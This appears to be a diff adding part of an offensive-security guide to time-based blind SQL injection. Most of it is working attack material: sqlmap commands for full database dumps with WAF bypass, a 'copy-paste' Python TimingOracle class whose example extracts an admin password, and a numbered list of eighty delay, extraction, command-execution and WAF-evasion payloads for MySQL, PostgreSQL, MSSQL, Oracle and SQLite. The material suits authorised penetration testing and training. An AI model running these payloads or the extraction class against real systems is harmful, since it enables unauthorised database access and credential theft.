+| HTTP/2 timeless timing | ~100ns (lab) | Very high |
+
+#### Timeless Timing Attacks (Van Goethem et al., USENIX Security 2020)
+
+"Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connections" eliminates network jitter entirely by measuring **relative** processing time instead of absolute response time.
+
+**Concept:** Send two requests concurrently in a single TCP packet -- a baseline request and an injection request. Do NOT measure how long each takes. Instead, observe which response arrives FIRST. If the injection request consistently arrives later, the condition was TRUE (delay occurred). Network jitter affects both requests identically, so it cancels out.
+
+**Protocol requirements:**
+- **HTTP/2:** Place two requests into a single TCP packet via multiplexing. Response order reveals the timing difference. Most precise.
+- **HTTP/1.1 (degraded):** Use "last-byte sync" technique -- send all-but-last-byte of both requests, then send final bytes near-simultaneously. Less precise but still effective.
+
+**Improvement over classical timing:**
+
+| Metric | Classical Remote Timing | Timeless Timing |
+|--------|------------------------|-----------------|
+| Minimum detectable difference | ~10 microseconds | ~100 nanoseconds |
+| Network jitter impact | Major | Eliminated |
+| Requests per measurement | 1 | 2 (concurrent pair) |
+| Statistical samples needed | 1000s | 20-50 |
+
+**Application to blind SQLi:**
+
+\`\`\`python
+# Pseudocode: Timeless timing SQLi extraction
+def extract_bit(position, bit_value):
+    baseline_request = "GET /search?q=test HTTP/2"
+    inject_request = f"GET /search?q=' OR IF(ASCII(SUBSTR(user(),{position},1))&{bit_value}, " \\
+                     f"BENCHMARK(1000,SHA1('x')),0)-- - HTTP/2"
+
+    results = []
+    for _ in range(50):  # 50 measurement pairs
+        order = send_concurrent_pair(baseline_request, inject_request)
+        results.append(order)
+
+    inject_slower_ratio = results.count('baseline_first') / len(results)
+    return 1 if inject_slower_ratio > 0.80 else 0
+\`\`\`
+
+#### Hakuin: ML-Optimized Blind SQL Injection (IEEE SPW 2023)
+
+Hakuin (Pruzinec & Nguyen, IEEE Security & Privacy Workshops 2023) applies probabilistic language models to predict database content, dramatically reducing the number of queries needed for extraction.
+
+**Key innovations:**
+- Language models trained on millions of Stack Exchange table/column names predict schema elements (6x faster schema extraction)
+- Adaptive language models learn from previously extracted content to predict subsequent characters (3.2x faster for general data)
+- Columns with limited value sets (enums, status codes) see 26x speedups
+- Ternary queries (three-way splits), opportunistic string guessing, and parallelized queries combined for optimal efficiency
+
+**Practical impact for time-based injection:** Where sqlmap requires hours for a full database dump, Hakuin reduces total request count by 3-26x. At 5 seconds per request, this translates from hours to minutes.
+
+**Tool:** https://github.com/pruzko/hakuin
+
+---
+
+## Tactics (MITRE ATT&CK)
+
+| Tactic | Technique ID | Description |
+|--------|-------------|-------------|
+| Initial Access | T1190 | Exploit Public-Facing Application |
+| Collection | T1005 | Data from Local System (database) |
+| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files (DB) |
+| Execution | T1059 | Command and Scripting Interpreter (via xp_cmdshell, COPY TO PROGRAM) |
+| Persistence | T1505.003 | Server Software Component: Web Shell (post-SQLi) |
+| Privilege Escalation | T1068 | Exploitation for Privilege Escalation (DB admin) |
+| Defense Evasion | T1027 | Obfuscated Files or Information (WAF bypass payloads) |
+| Exfiltration | T1041 | Exfiltration Over C2 Channel (character-by-character) |
+
+---
+
+## Tools
+
+### sqlmap (Primary -- Time-Based Mode)
+
+\`\`\`bash
+# Basic time-based scan
+sqlmap -u "https://target/page?id=1" --technique=T --time-sec=5 --dbms=mysql --threads=1
+
+# Thorough scan with WAF bypass
+sqlmap -u "https://target/page?id=1" --technique=T --time-sec=5 --level=5 --risk=3 \\
+  --tamper=space2comment,randomcase,between --random-agent --threads=1
+
+# POST parameter injection
+sqlmap -u "https://target/login" --data="user=admin&pass=test" -p pass \\
+  --technique=T --time-sec=5 --dbms=postgresql
+
+# Cookie injection
+sqlmap -u "https://target/page" --cookie="TrackingId=abc123" -p TrackingId \\
+  --technique=T --time-sec=5 --level=3
+
+# Header injection (X-Forwarded-For)
+sqlmap -u "https://target/page" --headers="X-Forwarded-For: 1*" \\
+  --technique=T --time-sec=5 --level=5
+
+# Full database dump
+sqlmap -u "https://target/page?id=1" --technique=T --time-sec=5 --dump-all \\
+  --threads=1 --random-agent
+\`\`\`
+
+**Key sqlmap parameters for time-based:**
+
+| Flag | Purpose | Recommended |
+|------|---------|-------------|
+| \`--technique=T\` | Force time-based only | Always for time-based testing |
+| \`--time-sec=N\` | Delay threshold (default 5) | 3 for fast networks, 10 for unstable |
+| \`--threads=1\` | Single-threaded (critical for timing) | Always 1 for time-based |
+| \`--level=5\` | Maximum test depth | Use for header/cookie injection |
+| \`--risk=3\` | Include heavy/dangerous payloads | Use for WAF bypass scenarios |
+| \`--tamper=<scripts>\` | Payload transformation | \`space2comment\`, \`randomcase\`, \`between\` |
+
+### Turbo Intruder (Burp Extension)
+
+Designed for high-performance HTTP/2 timing attacks. Used with Kettle's single-packet technique for sub-millisecond detection. Plans include t-test statistical analysis for automated detection.
+
+### Hakuin (ML-Optimized Extraction)
+
+\`\`\`bash
+pip install hakuin
+\`\`\`
+
+Probabilistic language model-guided extraction. 3-26x faster than sqlmap for blind injection.
+
+GitHub: https://github.com/pruzko/hakuin
+
+### Ghauri (WAF Bypass Specialist)
+
+Specifically designed for WAF bypass timing attacks. Implements multiple delay techniques per database with automatic tamper script selection.
+
+### Custom Scripts
+
+For advanced scenarios (HTTP/2 timing, adaptive calibration, parallel extraction), custom Python scripts with the \`requests\` or \`httpx\` library provide the most control. See the Network Jitter Mitigation section below for a complete reusable \`TimingOracle\` class.
+
+---
+
+## Network Jitter Mitigation
+
+Network latency is not constant. A response that takes 5.2 seconds might be a genuine 5-second \`SLEEP()\` plus 0.2 seconds of network latency, or it might be natural server load causing a 5.2-second response time, or network congestion adding 5.2 seconds of round-trip time. False positives (natural delay mistaken for injection) and false negatives (real delay masked by network noise) are constant risks. This section provides production-quality code for statistically reliable time-based blind extraction.
+
+### Baseline Measurement
+
+Before injecting any delays, establish the normal response time distribution:
+
+\`\`\`python
+import time
+import statistics
+import requests
+
+def measure_baseline(url, params, n=10):
+    """Send n benign requests, return (mean_time, stddev)"""
+    times = []
+    for _ in range(n):
+        start = time.time()
+        requests.get(url, params=params)
+        times.append(time.time() - start)
+    return statistics.mean(times), statistics.stdev(times)
+\`\`\`
+
+### Adaptive Delay Calibration
+
+The injected delay must be large enough to be distinguishable from natural variance. The rule of thumb: delay must be at least 5x the standard deviation above the baseline mean.
+
+\`\`\`python
+def calculate_delay(baseline_mean, baseline_stddev, multiplier=5):
+    """Delay must be at least 5x stddev above baseline mean"""
+    return max(baseline_mean + (multiplier * baseline_stddev), 2.0)
+\`\`\`
+
+**Example:** If baseline mean = 0.3s and stddev = 0.05s, then delay = max(0.3 + 5*0.05, 2.0) = max(0.55, 2.0) = 2.0 seconds. If baseline mean = 1.5s and stddev = 0.8s, then delay = max(1.5 + 5*0.8, 2.0) = max(5.5, 2.0) = 5.5 seconds.
+
+### Multiple-Sample Majority Vote
+
+A single measurement is unreliable. Send the same payload multiple times and use majority voting:
+
+\`\`\`python
+def is_true_with_confidence(url, payload, delay, samples=5):
+    """Send payload multiple times, majority vote on delay detection"""
+    detections = 0
+    for _ in range(samples):
+        start = time.time()
+        requests.get(url, params={"id": payload})
+        elapsed = time.time() - start
+        if elapsed >= delay * 0.8:  # 80% of expected delay
+            detections += 1
+    return detections > samples // 2  # majority vote
+\`\`\`
+
+### Kettle Bottom-Quartile Comparison
+
+James Kettle's technique from "Listen to the Whispers" (2024): compare the bottom quartile (lowest 25%) of response times rather than absolute values. The bottom quartile filters out noise-dominated outlier measurements caused by network congestion, GC pauses, and load spikes. Genuine timing differences persist in the fastest measurements.
+
+\`\`\`python
+def kettle_comparison(baseline_times, test_times):
+    """Compare bottom quartile of test vs baseline (Kettle technique)
+    Eliminates outliers caused by network congestion"""
+    baseline_q25 = sorted(baseline_times)[len(baseline_times) // 4]
+    test_q25 = sorted(test_times)[len(test_times) // 4]
+    return test_q25 - baseline_q25  # positive = likely delayed
+\`\`\`
+
+### Statistical Significance Tests
+
+For research-grade confidence, use formal statistical tests:
+
+\`\`\`python
+from scipy import stats
+
+def welch_t_test(baseline_times, injection_times):
+    """Welch's t-test: no assumption of equal variance.
+    Returns (t_statistic, p_value). p < 0.01 = statistically significant delay."""
+    t_stat, p_value = stats.ttest_ind(baseline_times, injection_times, equal_var=False)
+    return t_stat, p_value
+
+def mann_whitney_test(baseline_times, injection_times):
+    """Mann-Whitney U test: non-parametric, robust to outliers.
+    Works when response time distributions are non-normal."""
+    u_stat, p_value = stats.mannwhitneyu(baseline_times, injection_times, alternative='less')
+    return u_stat, p_value
+\`\`\`
+
+### Complete TimingOracle Class
+
+A production-quality, copy-paste reusable class for statistically reliable time-based blind SQL injection:
+
+\`\`\`python
+#!/usr/bin/env python3
+"""
+TimingOracle: Production-quality time-based blind SQL injection extraction.
+
+Features:
+  - Baseline measurement with statistical analysis
+  - Adaptive delay calibration (5x stddev formula)
+  - Multiple-sample majority vote for each condition
+  - Kettle bottom-quartile comparison for noise elimination
+  - Binary search character extraction
+  - Full string extraction with progress tracking
+
+Usage:
+    oracle = TimingOracle("https://target/page", "id")
+    oracle.calibrate()
+    if oracle.test_condition("1=1"):
+        password = oracle.extract_string(
+            "SELECT password FROM users WHERE username='admin'"
+        )
+        print(f"Extracted: {password}")
+"""
+
+import time
+import statistics
+import requests
+import sys
+
+
+class TimingOracle:
+    def __init__(self, url, param, delay=5, samples=5, verbose=True):
+        """
+        Args:
+            url: Target URL (e.g., "https://target/page")
+            param: Injectable parameter name (e.g., "id")
+            delay: Initial delay in seconds (overridden by calibrate())
+            samples: Number of samples per majority vote
+            verbose: Print progress to stderr
+        """
+        self.url = url
+        self.param = param
+        self.delay = delay
+        self.samples = samples
+        self.verbose = verbose
+        self.session = requests.Session()
+        self.baseline_mean = None
+        self.baseline_stddev = None
+        self.baseline_times = []
+        self.request_count = 0
+        # Database-specific payload templates (MySQL default)
+        self.sleep_template = "IF({condition}, SLEEP({delay}), 0)"
+        self.substr_func = "SUBSTRING"
+        self.ascii_func = "ASCII"
+
+    def set_dbms(self, dbms):
+        """Configure payload templates for target DBMS."""
+        dbms = dbms.lower()
+        if dbms in ("mysql", "mariadb"):
+            self.sleep_template = "IF({condition}, SLEEP({delay}), 0)"
+            self.substr_func = "SUBSTRING"
+            self.ascii_func = "ASCII"
+        elif dbms in ("postgresql", "postgres"):
+            self.sleep_template = (
+                "CASE WHEN ({condition}) "
+                "THEN pg_sleep({delay}) ELSE pg_sleep(0) END"
+            )
+            self.substr_func = "SUBSTRING"
+            self.ascii_func = "ASCII"
+        elif dbms in ("mssql", "sqlserver"):
+            self.sleep_template = (
+                "IF ({condition}) WAITFOR DELAY '0:0:{delay}'"
+            )
+            self.substr_func = "SUBSTRING"
+            self.ascii_func = "ASCII"
+        elif dbms == "oracle":
+            self.sleep_template = (
+                "CASE WHEN ({condition}) "
+                "THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END"
+            )
+            self.substr_func = "SUBSTR"
+            self.ascii_func = "ASCII"
+
+    def _send(self, payload_value):
+        """Send request with payload, return elapsed time in seconds."""
+        self.request_count += 1
+        start = time.time()
+        try:
+            self.session.get(
+                self.url,
+                params={self.param: payload_value},
+                timeout=self.delay * 3 + 10
+            )
+        except requests.exceptions.Timeout:
+            return self.delay * 3  # Treat timeout as maximum delay
+        return time.time() - start
+
+    def calibrate(self, n=10):
+        """Measure baseline response times and calculate optimal delay.
+
+        Sends n benign requests, computes mean + stddev, and sets
+        the delay to max(mean + 5*stddev, 2.0) seconds.
+        """
+        if self.verbose:
+            print(f"[*] Calibrating baseline with {n} requests...",
+                  file=sys.stderr)
+
+        self.baseline_times = []
+        for i in range(n):
+            elapsed = self._send("1")  # Benign value
+            self.baseline_times.append(elapsed)
+            if self.verbose:
+                print(f"    Request {i+1}/{n}: {elapsed:.3f}s",
+                      file=sys.stderr)
+
+        self.baseline_mean = statistics.mean(self.baseline_times)
+        self.baseline_stddev = statistics.stdev(self.baseline_times)
+
+        # Adaptive delay: 5x stddev above mean, minimum 2 seconds
+        self.delay = max(
+            self.baseline_mean + (5 * self.baseline_stddev),
+            2.0
+        )
+        self.delay = round(self.delay, 1)
+
+        if self.verbose:
+            print(f"[*] Baseline: mean={self.baseline_mean:.3f}s, "
+                  f"stddev={self.baseline_stddev:.3f}s", file=sys.stderr)
+            print(f"[*] Calibrated delay: {self.delay}s", file=sys.stderr)
+
+    def test_condition(self, condition_sql):
+        """Test a boolean SQL condition using majority vote.
+
+        Args:
+            condition_sql: SQL boolean expression, e.g. "1=1" or
+                "ASCII(SUBSTRING(user(),1,1))>97"
+
+        Returns:
+            True if condition is TRUE in the database, False otherwise.
+        """
+        payload_sql = self.sleep_template.format(
+            condition=condition_sql,
+            delay=int(self.delay)
+        )
+        injection = f"' AND {payload_sql}-- -"
+
+        detections = 0
+        test_times = []
+
+        for _ in range(self.samples):
+            elapsed = self._send(injection)
+            test_times.append(elapsed)
+            if elapsed >= self.delay * 0.8:
+                detections += 1
+
+        # Majority vote
+        is_true = detections > self.samples // 2
+
+        # Cross-check with Kettle bottom-quartile comparison
+        if len(self.baseline_times) >= 4 and len(test_times) >= 4:
+            bq_delta = self._kettle_comparison(
+                self.baseline_times, test_times
+            )
+            # If bottom-quartile delta > 50% of expected delay,
+            # this corroborates the majority vote
+            if bq_delta > self.delay * 0.5:
+                is_true = True
+
+        return is_true
+
+    def _kettle_comparison(self, baseline_times, test_times):
+        """Kettle bottom-quartile comparison.
+        Returns the difference between bottom quartiles."""
+        baseline_q25 = sorted(baseline_times)[len(baseline_times) // 4]
+        test_q25 = sorted(test_times)[len(test_times) // 4]
+        return test_q25 - baseline_q25
+
+    def extract_char(self, position, subquery):
+        """Extract a single character at the given position using
+        binary search over printable ASCII (32-126).
+
+        Args:
+            position: 1-based character position
+            subquery: SQL subquery returning the target string,
+                e.g. "SELECT password FROM users WHERE username='admin'"
+
+        Returns:
+            The character at that position, or None if extraction fails.
+        """
+        low, high = 32, 126
+
+        while low < high:
+            mid = (low + high) // 2
+            condition = (
+                f"{self.ascii_func}({self.substr_func}"
+                f"(({subquery}),{position},1))>{mid}"
+            )
+            if self.test_condition(condition):
+                low = mid + 1
+            else:
+                high = mid
+
+        if low == high and 32 <= low <= 126:
+            return chr(low)
+        return None
+
+    def extract_string(self, subquery, max_length=100):
+        """Extract a complete string from the database.
+
+        Args:
+            subquery: SQL subquery returning the target string
+            max_length: Maximum characters to extract (safety limit)
+
+        Returns:
+            The extracted string.
+        """
+        # Phase 1: Determine string length via binary search
+        length = self._find_length(subquery, max_length)
+        if self.verbose:
+            print(f"[*] String length: {length}", file=sys.stderr)
+
+        # Phase 2: Extract each character
+        result = []
+        for pos in range(1, length + 1):
+            char = self.extract_char(pos, subquery)
+            if char is None:
+                if self.verbose:
+                    print(f"[!] Failed to extract position {pos}",
+                          file=sys.stderr)
+                break
+            result.append(char)
+            if self.verbose:
+                print(f"[*] Position {pos}/{length}: '{char}' "
+                      f"(extracted: {''.join(result)}) "
+                      f"[{self.request_count} requests total]",
+                      file=sys.stderr)
+
+        return "".join(result)
+
+    def _find_length(self, subquery, max_length):
+        """Binary search for string length."""
+        low, high = 0, max_length
+
+        while low < high:
+            mid = (low + high) // 2
+            condition = f"LENGTH(({subquery}))>{mid}"
+            if self.test_condition(condition):
+                low = mid + 1
+            else:
+                high = mid
+
+        return low
+
+
+# === Example usage ===
+if __name__ == "__main__":
+    oracle = TimingOracle(
+        url="https://target.example.com/page",
+        param="id",
+        samples=5
+    )
+    oracle.set_dbms("mysql")
+    oracle.calibrate(n=10)
+
+    # Test if injection works
+    if oracle.test_condition("1=1"):
+        print("[+] Injection confirmed!", file=sys.stderr)
+
+        # Extract database version
+        version = oracle.extract_string("SELECT VERSION()")
+        print(f"[+] Database version: {version}")
+
+        # Extract admin password
+        password = oracle.extract_string(
+            "SELECT password FROM users WHERE username='admin'"
+        )
+        print(f"[+] Admin password: {password}")
+    else:
+        print("[-] Injection not confirmed", file=sys.stderr)
+\`\`\`
+
+### Decision Flowchart: When to Increase Delay vs. Samples
+
+\`\`\`
+Start: Test condition returns ambiguous result (2/5 or 3/5 detections)
+  |
+  v
+Is baseline stddev > 0.5 * delay?
+  |                    |
+  YES                  NO
+  |                    |
+  v                    v
+Increase delay       Increase samples
+(delay *= 1.5)       (samples += 2)
+  |                    |
+  v                    v
+Recalibrate          Re-test condition
+  |                    |
+  v                    v
+Still ambiguous?     Still ambiguous?
+  |        |          |        |
+  YES      NO         YES      NO
+  |        |          |        |
+  v        v          v        v
+Increase  Accept   Switch to  Accept
+delay     result   Kettle     result
+again              bottom-Q
+                   comparison
+                   with 30
+                   samples
+\`\`\`
+
+**Rules of thumb:**
+- If baseline stddev is high relative to delay: increase delay first
+- If baseline stddev is low but results are inconsistent: increase samples first
+- If both fail: switch to Kettle bottom-quartile comparison with 30 samples per measurement
+- If all fail: the endpoint may have async/queued processing where the delay occurs in the background and the HTTP response returns immediately -- time-based blind will not work for this endpoint
+
+---
+
+## Payload Crafting
+
+### MySQL / MariaDB Delays (20 payloads)
+
+| # | Payload | Function | Expected Delay | Conditional |
+|---|---------|----------|---------------|-------------|
+| 1 | \`' AND SLEEP(5)-- -\` | SLEEP | 5s | No |
+| 2 | \`' OR SLEEP(5)-- -\` | SLEEP | 5s | No (always triggers) |
+| 3 | \`(SELECT 1 FROM (SELECT SLEEP(5))A)\` | SLEEP | 5s | No (subquery) |
+| 4 | \`1'=sleep(5)='1\` | SLEEP | 5s | No (chained equality) |
+| 5 | \`' AND IF(1=1, SLEEP(5), 0)-- -\` | IF+SLEEP | 5s if TRUE | Yes |
+| 6 | \`' AND IF({cond}, SLEEP(5), 0)-- -\` | IF+SLEEP | 5s if TRUE | Yes (template) |
+| 7 | \`'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))OR'\` | XOR+SLEEP | 5s | Yes (NOW=SYSDATE always true) |
+| 8 | \`' OR ELT(1=1, SLEEP(5))-- -\` | ELT+SLEEP | 5s | Yes |
+| 9 | \`RLIKE SLEEP(5)\` | RLIKE+SLEEP | 5s | No |
+| 10 | \`/**/xor/**/sleep(5)\` | XOR+SLEEP | 5s | No (comment obfuscated) |
+| 11 | \`or (sleep(5)+1) limit 1-- -\` | SLEEP | 5s | No |
+| 12 | \`' AND BENCHMARK(10000000, MD5('x'))-- -\` | BENCHMARK | ~5s (CPU-dependent) | No |
+| 13 | \`' AND BENCHMARK(10000000, SHA1('test'))-- -\` | BENCHMARK | ~7s (CPU-dependent) | No |
+| 14 | \`' AND IF({cond}, BENCHMARK(10000000,MD5('x')), 0)-- -\` | IF+BENCHMARK | ~5s if TRUE | Yes |
+| 15 | \`' OR GET_LOCK('sqli', 5)-- -\` | GET_LOCK | 5s | No (blocks if lock held) |
+| 16 | \`' OR MAKE_SET(1, SLEEP(5))-- -\` | MAKE_SET+SLEEP | 5s | Yes |
+| 17 | \`' AND IF(ASCII(SUBSTRING(DATABASE(),{pos},1))>{mid}, SLEEP(5), 0)-- -\` | Extraction | 5s if TRUE | Yes (binary search) |
+| 18 | \`' AND IF(SUBSTRING(user(),1,1)='{c}', SLEEP(5), 0)-- -\` | Extraction | 5s if match | Yes (linear search) |
+| 19 | \`' AND (SELECT SLEEP(5) FROM DUAL WHERE DATABASE() LIKE '{pattern}')#\` | DUAL+SLEEP | 5s if match | Yes (LIKE) |
+| 20 | \`' AND IF(MID((SELECT file_priv FROM mysql.user WHERE user='root'),1,1)='Y', SLEEP(5), 0)-- -\` | Privilege check | 5s if FILE_PRIV | Yes |
+
+### PostgreSQL Delays (15 payloads)
+
+| # | Payload | Function | Expected Delay | Conditional |
+|---|---------|----------|---------------|-------------|
+| 21 | \`'; SELECT pg_sleep(5)--\` | pg_sleep | 5s | No |
+| 22 | \`' \\|\\| pg_sleep(5)--\` | pg_sleep | 5s | No (concat) |
+| 23 | \`AND 1=(SELECT 1 FROM pg_sleep(5))\` | pg_sleep | 5s | No (subquery) |
+| 24 | \`AND 'x'\\|\\|pg_sleep(5)='x'\` | pg_sleep | 5s | No (string equality) |
+| 25 | \`'; SELECT pg_sleep_for('5 seconds')--\` | pg_sleep_for | 5s | No (PG >= 15) |
+| 26 | \`'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--\` | CASE+pg_sleep | 5s if TRUE | Yes |
+| 27 | \`'; SELECT CASE WHEN ({cond}) THEN pg_sleep(5) ELSE pg_sleep(0) END--\` | CASE+pg_sleep | 5s if TRUE | Yes (template) |
+| 28 | \`'; SELECT CASE WHEN ASCII(SUBSTRING(({subq}),{pos},1))>{mid} THEN pg_sleep(5) ELSE pg_sleep(0) END--\` | Extraction | 5s if TRUE | Yes (binary search) |
+| 29 | \`'; SELECT CASE WHEN SUBSTRING(datname,1,1)='{c}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM pg_database LIMIT 1--\` | DB enum | 5s if match | Yes |
+| 30 | \`'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{n}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--\` | Length check | 5s if TRUE | Yes |
+| 31 | \`'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{pos},1)='{c}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--\` | Data extraction | 5s if match | Yes |
+| 32 | \`AND 1=(SELECT COUNT(*) FROM GENERATE_SERIES(1, 5000000))\` | GENERATE_SERIES | ~5-10s | No (heavy query) |
+| 33 | \`'; WITH d AS (SELECT 5 AS v) SELECT pg_sleep(v) FROM d;--\` | CTE+pg_sleep | 5s | No (variable) |
+| 34 | \`' OR (SELECT dblink_connect('host=10.255.255.1 dbname=x connect_timeout=5'))-- -\` | dblink timeout | 5s | No (non-routable IP) |
+| 35 | \`AND (SELECT COUNT(*) FROM pg_catalog.pg_class A, pg_catalog.pg_class B, pg_catalog.pg_class C) > 0\` | Cartesian | Variable | No (heavy query) |
+
+### MSSQL / SQL Server Delays (15 payloads)
+
+| # | Payload | Function | Expected Delay | Conditional |
+|---|---------|----------|---------------|-------------|
+| 36 | \`'; WAITFOR DELAY '0:0:5'--\` | WAITFOR DELAY | 5s | No |
+| 37 | \`1; WAITFOR DELAY '0:0:5'--\` | WAITFOR DELAY | 5s | No (numeric) |
+| 38 | \`'); WAITFOR DELAY '0:0:5'--\` | WAITFOR DELAY | 5s | No (paren) |
+| 39 | \`')); WAITFOR DELAY '0:0:5'--\` | WAITFOR DELAY | 5s | No (double paren) |
+| 40 | \`'; WAITFOR DELAY '0:0:0.5'--\` | WAITFOR DELAY | 0.5s | No (fractional) |
+| 41 | \`'; IF (1=1) WAITFOR DELAY '0:0:5'--\` | IF+WAITFOR | 5s if TRUE | Yes |
+| 42 | \`'; IF ({cond}) WAITFOR DELAY '0:0:5'--\` | IF+WAITFOR | 5s if TRUE | Yes (template) |
+| 43 | \`'; IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:5'--\` | SA check | 5s if sa | Yes |
+| 44 | \`'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--\` | Role check | 5s if sysadmin | Yes |
+| 45 | \`'; IF ASCII(SUBSTRING(DB_NAME(),{pos},1))>{mid} WAITFOR DELAY '0:0:5'--\` | Extraction | 5s if TRUE | Yes (binary search) |
+| 46 | \`'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),{pos},1))>{mid}) WAITFOR DELAY '0:0:5'--\` | Table enum | 5s if TRUE | Yes |
+| 47 | \`'; DECLARE @s VARCHAR(8000) SELECT @s=DB_NAME() IF(ASCII(SUBSTRING(@s,{pos},1))&(POWER(2,{bit})))>0 WAITFOR DELAY '0:0:5'--\` | Bitwise | 5s if bit=1 | Yes (Anley) |
+| 48 | \`'; WAITFOR TIME '23:59:59'--\` | WAITFOR TIME | Until time | No (absolute) |
+| 49 | \`'; EXEC xp_cmdshell 'ping -n 6 127.0.0.1'--\` | xp_cmdshell | ~5s | No (requires sysadmin) |
+| 50 | \`'; WAITFOR DELAY '0:0:'+CHAR(53);--\` | CHAR concat | 5s | No (WAF bypass) |
+
+### Oracle Delays (10 payloads)
+
+| # | Payload | Function | Expected Delay | Conditional |
+|---|---------|----------|---------------|-------------|
+| 51 | \`AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)\` | DBMS_PIPE | 5s | No |
+| 52 | \`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--\` | DBMS_PIPE | 5s | No (string context) |
+| 53 | \`AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1337 END)\` | CASE+DBMS_PIPE | 5s if TRUE | Yes |
+| 54 | \`' \\|\\| (SELECT CASE WHEN (1=1) THEN 'a'\\|\\|DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END FROM dual)--\` | PortSwigger form | 5s if TRUE | Yes |
+| 55 | \`AND 1=(SELECT CASE WHEN ASCII(SUBSTR(user,{pos},1))>{mid} THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)\` | Extraction | 5s if TRUE | Yes |
+| 56 | \`AND 1=(SELECT CASE WHEN ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),{pos},1))>{mid} THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)\` | Version extraction | 5s if TRUE | Yes |
+| 57 | \`BEGIN DBMS_LOCK.SLEEP(5); END;--\` | DBMS_LOCK | 5s | No (PL/SQL only, stacked queries required) |
+| 58 | \`BEGIN DBMS_SESSION.SLEEP(5); END;--\` | DBMS_SESSION | 5s | No (Oracle >= 18c, PL/SQL only) |
+| 59 | \`AND (SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C) > 0\` | Cartesian | Variable | No (heavy query) |
+| 60 | \`' OR (SELECT COUNT(*) FROM (SELECT 1 FROM dual CONNECT BY LEVEL <= 5000000)) > 0-- -\` | CONNECT BY | Variable | No (heavy query) |
+
+### SQLite Delays (5 payloads)
+
+| # | Payload | Function | Expected Delay | Conditional |
+|---|---------|----------|---------------|-------------|
+| 61 | \`AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\` | RANDOMBLOB chain | ~5s (CPU-dependent) | No |
+| 62 | \`AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\` | RANDOMBLOB chain | ~10s | No |
+| 63 | \`AND CASE WHEN (1=1) THEN LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END\` | Conditional RANDOMBLOB | ~5s if TRUE | Yes |
+| 64 | \`AND CASE WHEN UNICODE(SUBSTR(({subq}),{pos},1))>{mid} THEN LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END\` | Extraction | ~5s if TRUE | Yes (binary search) |
+| 65 | \`AND LENGTH(ZEROBLOB(800000000)) > 0\` | ZEROBLOB | Variable | No |
+
+### Heavy Queries -- All Databases (10 payloads)
+
+| # | Payload | Database | Expected Delay |
+|---|---------|----------|---------------|
+| 66 | \`AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) > 0\` | MySQL/MSSQL | 5-15s |
+| 67 | \`AND (SELECT COUNT(*) FROM sysusers AS s1, sysusers AS s2, sysusers AS s3, sysusers AS s4, sysusers AS s5, sysusers AS s6, sysusers AS s7, sysusers AS s8) > 0\` | MSSQL | ~14s (Chema Alonso) |
+| 68 | \`AND (SELECT COUNT(*) FROM GENERATE_SERIES(1, 10000000)) > 0\` | PostgreSQL | ~5-10s |
+| 69 | \`AND (SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C) > 0\` | Oracle | 5-15s |
+| 70 | \`AND (SELECT COUNT(*) FROM all_users A, all_users B, all_users C, all_users D) > 0\` | Oracle | Variable |
+| 71 | \`AND (SELECT COUNT(*) FROM MSysAccessObjects AS T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, MSysAccessObjects AS T7, MSysAccessObjects AS T8, MSysAccessObjects AS T9, MSysAccessObjects AS T10) > 0\` | MS Access | ~6s (Chema Alonso) |
+| 72 | \`WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r WHERE n < 5000000) SELECT COUNT(*) FROM r\` | PostgreSQL/SQLite/MSSQL | 5-15s |
+| 73 | \`AND EXISTS(SELECT COUNT(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C GROUP BY MID(NOW(),1))\` | MySQL | ~5-10s |
+| 74 | \`AND (SELECT COUNT(*) FROM pg_catalog.pg_class A, pg_catalog.pg_class B, pg_catalog.pg_class C) > 0\` | PostgreSQL | Variable |
+| 75 | \`AND (SELECT COUNT(*) FROM (SELECT 1 FROM dual CONNECT BY LEVEL <= 5000000)) > 0\` | Oracle | Variable |
+
+### WAF Evasion Payloads (24 techniques)
+
+| # | Technique | Payload Example | Bypasses |
+|---|-----------|----------------|----------|
+| 76 | BENCHMARK substitution | \`' OR BENCHMARK(10000000, MD5('A'))-- -\` | SLEEP keyword filter |
+| 77 | MySQL version comments | \`' OR /*!50000SLEEP*/(5)-- -\` | Comment-unaware WAFs |
+| 78 | Split version comments | \`' OR /*!50000SL*//*!50000EEP*/(5)-- -\` | Keyword reconstruction |
+| 79 | CASE WHEN instead of IF | \`' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -\` | IF keyword filter |
+| 80 | Inline comment injection | \`' OR SL/**/EEP(5)-- -\` | Regex-based keyword detection |
